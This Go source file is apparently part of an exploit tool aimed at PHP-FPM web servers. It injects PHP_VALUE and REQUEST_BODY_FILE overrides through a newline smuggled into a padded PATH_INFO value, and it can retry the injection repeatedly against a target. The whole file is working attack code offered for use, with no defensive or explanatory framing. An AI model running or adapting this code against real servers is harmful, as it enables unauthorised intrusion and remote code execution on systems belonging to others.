package main

import (
	"fmt"
	"log"
	"net/http"
)

type Overrider struct {
	Requester *Requester
	Params    *AttackParams
}

func (o *Overrider) Override(hdr HeaderType, name, value, queryStringPrefix string) (*http.Response, []byte, error) {
	payload, err := makePathInfo(name, value)
	if err != nil {
		return nil, nil, err
	}
	return o.Requester.RequestEx(payload, o.Params, queryStringPrefix, hdr)
}

func (o *Overrider) PHPValue(value, queryStringPrefix string) (*http.Response, []byte, error) {
	return o.Override(HdrEbutMamku, "PHP_VALUE", value, queryStringPrefix)
}

func (o *Overrider) RequestBodyFile(value, queryStringPrefix string) (*http.Response, []byte, error) {
	return o.Override(HdrIOnaNeProtiv, "REQUEST_BODY_FILE", value, queryStringPrefix)
}

func (o *Overrider) PHPValueWithRetries(value string, tries int) error {
	log.Printf("Trying to set %#v...", value)
	for i := 0; i < tries; i++ {
		if _, _, err := o.PHPValue(value, ""); err != nil {
			return fmt.Errorf("error while setting %#v: %v", value, err)
		}
	}
	return nil
}

func makePathInfo(name, value string) (string, error) {
	pi := "/" + name + "\n" + value
	if len(pi) != PosOffset {
		return "", fmt.Errorf("override has wrong length: %#v", pi)
	}
	return pi, nil
}
